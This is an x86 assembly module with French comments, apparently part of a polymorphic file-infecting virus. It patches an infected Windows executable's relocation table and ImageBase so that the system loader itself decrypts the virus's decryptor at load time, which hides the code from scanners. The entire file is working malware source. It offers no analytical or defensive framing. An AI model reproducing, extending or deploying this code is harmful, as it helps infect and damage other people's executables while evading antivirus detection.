   ;MODULE : RELOCATION
   ;Ce module implémente l'encryption du décrypteur via la technique des relocations.



   ;ENCRYPTION_RELOCS_INIT : initialise le module pour un hote donné
   ;verifie notamment si 'lencryption via reloc est possible
   ;in : none
   ;out: is_relocated positionné, Imagebase de l'hote eventuellement modifée
   encryption_relocs_init proc near
       pusha
       mov byte ptr [ebp+is_relocated],0

       mov eax,PROBA_ENCRYPTION_RELOCS
       call rand_tuna
       test eax,eax
       jnz pas_encryption_relocs           ;proba = 1/PROBA_ENCRYPTION_RELOCS
       cmp [edx+0A0h],eax
       jz pas_encryption_relocs            ;pas si relocs absente de l'exe
       inc byte ptr [ebp+is_relocated]

       mov [ebp+imagebase],dword ptr IMAGEBASE_DEFAUT
       call reloge_hote

   ;choisit une imagebase impossible
       xor eax,eax
       dec eax
       call rand_tuna
       or eax,80000000h
       xor ax,ax
       mov [ebp+relocated_imagebase],eax
       mov [edx+34h],eax

   pas_encryption_relocs:
       popa
       ret
   encryption_relocs_init endp

   ;ENCRYPTION_RELOCS : encrypte le decrypteur via la tech des relocs
   ; avec une probabilité de 1/PROBA_ENCRYPTION_RELOCS
   ;
   ; in : table locations remplie, edx->pe header  ebx->filemapping
   ; out: none

   encryption_relocs proc near
       pusha
       cmp [ebp+is_relocated],byte ptr 0
       jz pas_relocated

    ;   jmp pas_relocated

   ;localise les relocs
       mov eax,[edx+0A0h]
       call rva2raw
       lea edi,[eax+ebx]                   ;edi-->relocs de l'hote
       mov ecx,[edx+0A0h+4]                ;ecx=taille des relocs
       and [ebp+vtmp1],dword ptr 0         ;indice des parties
       mov [ebp+vtmp2],edx

   enc_rel_boucle:
       cmp ecx,8+NB_RELOCS_PAR_ILOT*4      ;y'a encore de la place ?
       jle encryption_relocs_fin
       mov eax,[ebp+vtmp1]
       lea esi,[ebp+eax*8+locations]
       lodsd                               ;choisit un ilot (=une partie) au hasard
       mov esi,eax                         ;esi=rva de l'ilot

   ;genere le reloc_chunk
       mov edx,NB_RELOCS_PAR_ILOT          ;nb de relocs à appliquer
       mov eax,esi
       stosd
       lea eax,[edx*2+8]                   ;taille du reloc_chunk
       stosd
       sub ecx,8
   reloc_boucle:
       push ebx
       mov eax,PARTIE_MAX_SIZE/NB_RELOCS_PAR_ILOT-4  ;genere la reloc
       call rand_tuna
       mov ebx,edx
       dec ebx
       imul ebx,(PARTIE_MAX_SIZE/NB_RELOCS_PAR_ILOT)
       add eax,ebx
       pop ebx
       or eax,03000h                       ;reloc 32bits
       stosw
       dec ecx
       dec ecx

       push ecx edx                        ;encrypte la cible de la reloc
       mov ecx,eax                         ;(qui sera décryptée au chargement de l'exe, cf. tuto)
       and ecx,0FFFh
       mov eax,esi
       mov edx,[ebp+vtmp2]
       call rva2raw
       add eax,ebx
       add eax,ecx
       mov ecx,IMAGEBASE_DEFAUT
       sub ecx,[ebp+relocated_imagebase]
       sub [eax],ecx                       ;encrypte
       pop edx ecx

       dec edx
       jnz reloc_boucle
       inc dword ptr [ebp+vtmp1]
       mov eax,[ebp+vtmp1]
       cmp al,[ebp+poly_nb_parties_decrypteur]
       jae encryption_relocs_fin
       jmp enc_rel_boucle

   encryption_relocs_fin:
       xor eax,eax
       stosd                               ; reloc chunk vide pour la fin
       mov edx,[ebp+vtmp2]
       mov eax,[edx+0A0h+4]
       sub eax,ecx                         ; nouvelle taille de relocs
       mov [edx+0A0h+4],eax
   pas_relocated:
       popa
       ret
   encryption_relocs endp

   ;RELOGE_HOTE : applique les relocations de l'hote infecté pour le
   ;reloger à l'adresse IMAGEBASE_DEFAUT
   ;in : edx-->PE header de l'hote ebx-->hote filemappé
   ;out: none
   reloge_hote proc near
       pusha
       mov eax,[edx+0A0h]
       call rva2raw
       lea esi,[eax+ebx]                   ;edi-->relocs de l'hote
   reloge_1:
       lodsd
       test eax,eax
       jz reloge_fin
       call rva2raw
       lea edi,[eax+ebx]
       lodsd
       mov ecx,eax
       sub ecx,8
       shr ecx,1
   reloge_2:
       push ebx
       lodsw
       mov bx,ax
       and eax,0FFFh
       and bx,0F000h
       cmp bx,0000h
       jz pas_reloge
       cmp bx,3000h
       jz reloge_32
       int 3
   reloge_32:
       lea ebx,[edi+eax]
       mov eax,[edx+34h]
       sub eax,IMAGEBASE_DEFAUT
       sub [ebx],eax
   pas_reloge:
       pop ebx
       loop reloge_2
       jmp reloge_1
   reloge_fin:
       popa
       ret
   reloge_hote endp
